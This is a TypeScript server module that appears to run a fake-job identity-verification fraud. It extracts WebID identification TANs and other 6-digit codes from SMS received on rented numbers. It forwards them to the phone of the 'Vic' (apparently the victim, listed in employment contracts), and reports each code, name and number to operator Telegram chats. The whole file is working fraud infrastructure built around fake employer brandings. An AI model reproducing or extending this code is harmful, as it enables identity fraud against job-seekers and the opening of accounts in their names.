// Shared TAN forwarding logic for ident sessions.
// Called from anosim-proxy / smsbot-proxy (browser-triggered polls) and
// sms-inbox-watch (backend watcher). Idempotent via `forwarded_sms` keys
// (`sender|date`), so concurrent pollers never double-forward.
//
// Behavior (mirrors the recovery-panel reference):
// - Only active sessions (status waiting / data_sent) are processed.
// - Only SMS newer than session.updated_at are considered.
// - The WebID TAN pattern is preferred; otherwise any standalone 6-digit code.
// - Forward text: "<code> - Ihr Code für die Verifizierung"
// - Sends via seven.io using the branding's own seven_api_key / sms_sender_name.
// - Logs to sms_logs and notifies Telegram chats subscribed to
//   "tan_weitergeleitet" (falls back to "sms_empfangen" subscribers).

import { createClient } from "npm:@supabase/supabase-js@2";
import { buildTelegramMessage } from "./telegramMessage.ts";

const WEBID_TAN_REGEX = /WebID\s+Identification\s+TAN\s*\/\s*Code\s*:\s*(\d{6})/i;
const GENERIC_TAN_REGEX = /(?<!\d)\d{6}(?!\d)/;

export interface IncomingSms {
  sender: string;
  date: string;
  text: string;
}

export interface ForwardOutcome {
  forwarded: number;
  checked: number;
  reason?: string;
}

function serviceClient() {
  return createClient(
    Deno.env.get("SUPABASE_URL")!,
    Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!,
    { auth: { persistSession: false } },
  );
}

function normalizePhone(phone: string): string {
  let cleaned = phone.replace(/(?!^\+)\D/g, "");
  if (cleaned.startsWith("0")) cleaned = "+49" + cleaned.slice(1);
  if (cleaned.startsWith("49") && !cleaned.startsWith("+")) cleaned = "+" + cleaned;
  return cleaned;
}

async function sendSevenSms(
  apiKey: string,
  fromName: string,
  to: string,
  text: string,
): Promise<{ ok: boolean; info: string }> {
  try {
    const res = await fetch("https://gateway.seven.io/api/sms", {
      method: "POST",
      headers: {
        "X-Api-Key": apiKey,
        "Content-Type": "application/json",
        Accept: "application/json",
      },
      body: JSON.stringify({ to, text, from: fromName.substring(0, 11) }),
    });
    const info = await res.text();
    let ok = res.ok;
    try {
      const parsed = JSON.parse(info);
      if (typeof parsed === "object" && parsed !== null) {
        ok = res.ok && (parsed.success === "100" || parsed.success === 100 || Array.isArray(parsed.messages));
      }
    } catch {
      ok = res.ok && info.trim().startsWith("100");
    }
    return { ok, info };
  } catch (e) {
    return { ok: false, info: String(e) };
  }
}

async function notifyTelegram(
  supabase: any,
  brandingId: string | null,
  message: string,
): Promise<void> {
  const botToken = Deno.env.get("TELEGRAM_BOT_TOKEN");
  if (!botToken) return;

  // Prefer chats subscribed to "tan_weitergeleitet"; fall back to "sms_empfangen".
  let { data: chats } = await supabase
    .from("telegram_chats")
    .select("chat_id, branding_ids")
    .contains("events", ["tan_weitergeleitet"]);

  if (!chats || chats.length === 0) {
    const fallback = await supabase
      .from("telegram_chats")
      .select("chat_id, branding_ids")
      .contains("events", ["sms_empfangen"]);
    chats = fallback.data;
  }
  if (!chats || chats.length === 0) return;

  const targets = brandingId
    ? chats.filter((c: any) => !c.branding_ids || c.branding_ids.length === 0 || c.branding_ids.includes(brandingId))
    : chats;

  await Promise.allSettled(
    targets.map((chat: any) =>
      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: chat.chat_id, text: message, parse_mode: "HTML" }),
      }),
    ),
  );
}

/**
 * Forwards new SMS of one ident session to the Vic's private number.
 * Safe to call from multiple pollers concurrently.
 */
export async function processSessionForward(
  sessionId: string,
  messages: IncomingSms[],
): Promise<ForwardOutcome> {
  const supabase = serviceClient();

  const { data: session } = await supabase
    .from("ident_sessions")
    .select("id, status, contract_id, order_id, branding_id, updated_at, forward_tan_to_vic, forwarded_sms")
    .eq("id", sessionId)
    .maybeSingle();

  if (!session) return { forwarded: 0, checked: 0, reason: "session_missing" };
  if (session.forward_tan_to_vic !== true) return { forwarded: 0, checked: 0, reason: "forwarding_disabled" };
  if (!["waiting", "data_sent"].includes(session.status)) {
    return { forwarded: 0, checked: 0, reason: "status_locked" };
  }
  if (messages.length === 0) return { forwarded: 0, checked: 0 };

  const { data: contract } = await supabase
    .from("employment_contracts")
    .select("first_name, last_name, phone")
    .eq("id", session.contract_id)
    .maybeSingle();
  const vicPhone = (contract?.phone ?? "").trim();
  if (!vicPhone) return { forwarded: 0, checked: 0, reason: "no_vic_phone" };
  const vicName = `${contract?.first_name ?? ""} ${contract?.last_name ?? ""}`.trim() || "Mitarbeiter";

  let orderTitle: string | null = null;
  if (session.order_id) {
    const { data: order } = await supabase
      .from("orders")
      .select("title")
      .eq("id", session.order_id)
      .maybeSingle();
    orderTitle = (order?.title as string) ?? null;
  }

  let branding: any = null;
  if (session.branding_id) {
    const { data } = await supabase
      .from("brandings")
      .select("seven_api_key, sms_sender_name, company_name")
      .eq("id", session.branding_id)
      .maybeSingle();
    branding = data;
  }
  const sevenKey = (branding?.seven_api_key as string | undefined)?.trim()
    || Deno.env.get("SEVEN_API_KEY")
    || null;
  if (!sevenKey) return { forwarded: 0, checked: 0, reason: "no_seven_key" };
  const senderName = (branding?.sms_sender_name as string | undefined)?.trim() || "Vic";
  const brandingName = (branding?.company_name as string | undefined) ?? null;

  const cutoff = new Date(session.updated_at).getTime();
  const forwardedSet = new Set<string>(
    Array.isArray(session.forwarded_sms) ? (session.forwarded_sms as string[]) : [],
  );
  const initialSize = forwardedSet.size;

  let forwardedCount = 0;
  let checkedCount = 0;

  for (const m of messages) {
    if (!m.date || !m.sender) continue;
    const t = new Date(m.date).getTime();
    if (!Number.isNaN(t) && t < cutoff) continue;
    const key = `${m.sender}|${m.date}`;
    if (forwardedSet.has(key)) continue;

    checkedCount++;
    const text = String(m.text ?? "");
    const match = text.match(WEBID_TAN_REGEX) ?? text.match(GENERIC_TAN_REGEX);

    if (match) {
      const code = match[1] ?? match[0];
      const body = `${code} - Ihr Code für die Verifizierung`;
      const result = await sendSevenSms(sevenKey, senderName, normalizePhone(vicPhone), body);

      await supabase.from("sms_logs").insert({
        recipient_phone: normalizePhone(vicPhone),
        recipient_name: vicName,
        message: body,
        event_type: "tan_forwarded",
        status: result.ok ? "sent" : "failed",
        error_message: result.ok ? null : result.info,
        branding_id: session.branding_id ?? null,
      });

      if (result.ok) {
        forwardedCount++;
        forwardedSet.add(key);
        try {
          await notifyTelegram(supabase, session.branding_id ?? null, buildTelegramMessage({
            icon: "📨",
            title: "TAN weitergeleitet",
            fields: [
              { icon: "👤", label: "Mitarbeiter", value: vicName, bold: true },
              { icon: "📦", label: "Auftrag", value: orderTitle },
              { icon: "📱", label: "Vic-Nummer", value: vicPhone },
              { icon: "🔢", label: "Code", value: code, bold: true },
              { icon: "✉️", label: "Absender", value: String(m.sender) },
            ],
            brandingName,
          }));
        } catch (e) {
          console.error("telegram tan_weitergeleitet failed", e);
        }
      } else {
        console.error("seven.io forward failed", result.info);
        // not marked as processed -> retried on next poll
      }
    } else {
      // No code in this SMS -> mark as processed, never forward.
      forwardedSet.add(key);
    }
  }

  if (forwardedSet.size !== initialSize) {
    await supabase
      .from("ident_sessions")
      .update({ forwarded_sms: Array.from(forwardedSet) })
      .eq("id", sessionId);
  }

  return { forwarded: forwardedCount, checked: checkedCount };
}

/**
 * Convenience: resolves the active ident session for a phone identifier
 * (Anosim share URL or `smsbot://<rentalId>`) and forwards new SMS.
 */
export async function forwardByPhoneIdentifier(
  phoneApiUrl: string,
  messages: IncomingSms[],
): Promise<ForwardOutcome> {
  if (!phoneApiUrl || messages.length === 0) return { forwarded: 0, checked: 0 };
  const supabase = serviceClient();
  const { data: session } = await supabase
    .from("ident_sessions")
    .select("id")
    .eq("phone_api_url", phoneApiUrl)
    .in("status", ["waiting", "data_sent"])
    .order("updated_at", { ascending: false })
    .limit(1)
    .maybeSingle();
  if (!session?.id) return { forwarded: 0, checked: 0, reason: "no_active_session" };
  return processSessionForward(session.id, messages);
}
